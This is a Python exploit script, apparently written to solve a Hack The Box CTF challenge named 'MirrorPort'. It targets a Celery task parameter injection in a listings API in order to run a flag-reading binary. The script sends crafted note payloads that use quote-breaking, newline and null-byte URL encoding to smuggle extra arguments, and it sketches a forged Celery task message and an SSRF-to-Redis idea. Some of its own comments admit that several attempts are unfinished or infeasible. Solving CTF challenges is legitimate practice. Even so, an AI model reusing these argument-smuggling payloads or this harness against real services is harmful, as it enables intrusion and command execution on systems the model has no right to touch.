#!/usr/bin/env python3
"""
MirrorPort Exploit Script

This script attempts to exploit the Celery task parameter injection vulnerability
to execute /usr/local/bin/read_flag and retrieve the flag.

Author: CTF Solver
Date: 2025-11-23
"""

import json
import requests
import time
import sys
import re
from datetime import datetime


class MirrorPortExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def log(self, message):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def create_listing(self, seller_name, scroll_name, price, note=None, image_url=None):
        """Create a new listing."""
        data = {
            "seller_name": seller_name,
            "scroll_name": scroll_name,
            "price": price,
            "description": "Test listing for exploitation"
        }

        if note:
            data['note'] = note
        if image_url:
            data['image_url'] = image_url

        response = self.session.post(
            f"{self.base_url}/api/listings",
            json=data
        )

        if response.status_code == 201:
            listing = response.json()
            self.log(f"Listing created successfully: ID={listing['id']}")
            return listing
        else:
            self.log(f"Failed to create listing: {response.text}")
            return None

    def check_listing_status(self, listing_id):
        """Check if listing URLs have been processed."""
        response = self.session.get(f"{self.base_url}/api/listings/{listing_id}/status")
        if response.status_code == 200:
            return response.json().get('processed', False)
        return False

    def test_curl_binary_injection(self, listing_id):
        """
        Test the curl_binary parameter injection theory.

        Theory: When Celery deserializes the task message, if we can inject
        a third argument, it will be used as the curl_binary parameter.
        """
        self.log("Testing curl_binary parameter injection...")
        self.log("Note: This requires direct Redis/Celery message manipulation")
        self.log("The listing API only accepts URL and listing_id, not curl_binary")

        return False

    def attempt_via_markdown_urls(self):
        """
        Attempt to exploit via markdown URL parsing.

        If the markdown parser can be confused into extracting additional
        content from the note field, we might inject extra arguments.
        """
        self.log("Testing markdown URL parsing edge cases...")

        test_cases = [
            # Try to confuse the parser
            "![test](http://example.com)\", 123, \"/usr/local/bin/read_flag\")",
            "![test](http://example.com) /usr/local/bin/read_flag",
            # URL encoding tricks
            "![test](http://example.com%0a/usr/local/bin/read_flag)",
            "![test](http://example.com%00/usr/local/bin/read_flag)",
            # Multiple URLs - maybe second one gets processed differently?
            "![a](http://example.com) ![b](/usr/local/bin/read_flag)",
        ]

        for i, note in enumerate(test_cases):
            self.log(f"\n--- Test Case {i+1} ---")
            self.log(f"Note: {repr(note[:50])}")

            listing = self.create_listing(
                seller_name=f"TestSeller{i}",
                scroll_name=f"TestScroll{i}",
                price=100,
                note=note
            )

            if listing:
                # Wait for processing
                self.log("Waiting for Celery processing...")
                for _ in range(10):
                    if self.check_listing_status(listing['id']):
                        self.log("Listing processed!")
                        break
                    time.sleep(2)

                # Check if any cache files contain the flag
                self.scan_for_flag(listing['id'])

    def scan_for_flag(self, listing_id):
        """Scan cached content for the flag pattern."""
        self.log("Scanning for flag in cached content...")

        # Try various potential cache patterns
        test_urls = [
            f"/cache/cache_{listing_id}_",
        ]

        for test_url in test_urls:
            try:
                response = self.session.get(f"{self.base_url}{test_url}")
                if response.status_code == 200:
                    content = response.text
                    # Look for flag pattern
                    flag_match = re.search(r'HTB\{[^}]+\}', content)
                    if flag_match:
                        self.log(f"")
                        self.log("=" * 50)
                        self.log("FLAG FOUND!")
                        self.log(f"Flag: {flag_match.group()}")
                        self.log("=" * 50)
                        self.log("")
                        return True
            except Exception as e:
                self.log(f"Error checking {test_url}: {e}")

        self.log("Flag not found in cached content")
        return False

    def attempt_direct_redis(self):
        """
        Direct Redis injection attempt.

        If SSRF can access Redis (port 6379), we could directly inject
        a malicious Celery task message.
        """
        self.log("Testing direct Redis access via SSRF...")

        # Redis protocol is text-based
        # We need to craft a Celery message and inject it via Redis LPUSH

        # A minimal Celery task message (simplified format)
        task_message = {
            "id": "exploit-task-123",
            "task": "tasks.fetch_url",
            "args": ["http://127.0.0.1:3000", 1, "/usr/local/bin/read_flag"],
            "kwargs": {}
        }

        # The challenge would be to send this via HTTP to Redis
        # Redis doesn't speak HTTP, so this is likely not possible

        self.log("Redis protocol is not HTTP-based")
        self.log("SSRF to Redis directly is not feasible")

        return False

    def run_exploit(self):
        """Run the full exploitation chain."""
        self.log("=" * 60)
        self.log("MirrorPort Exploit - Celery Task Parameter Injection")
        self.log("Target: " + self.base_url)
        self.log("=" * 60)
        self.log("")

        # Test 1: Markdown URL parsing
        self.log("\n[+] Test 1: Markdown URL Parsing Edge Cases")
        self.log("-" * 60)
        self.attempt_via_markdown_urls()

        # Test 2: Direct Redis
        self.log("\n[+] Test 2: Direct Redis Access")
        self.log("-" * 60)
        self.attempt_direct_redis()

        # Test 3: Celery message format injection
        self.log("\n[+] Test 3: Celery Message Format Injection")
        self.log("-" * 60)
        self.test_curl_binary_injection(0)

        self.log("")
        self.log("=" * 60)
        self.log("Exploitation attempts completed")
        self.log("=" * 60)


def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit_mirrorport.py <base_url>")
        print("Example: python exploit_mirrorport.py http://154.57.164.68:32728")
        sys.exit(1)

    base_url = sys.argv[1]
    exploit = MirrorPortExploit(base_url)
    exploit.run_exploit()


if __name__ == "__main__":
    main()
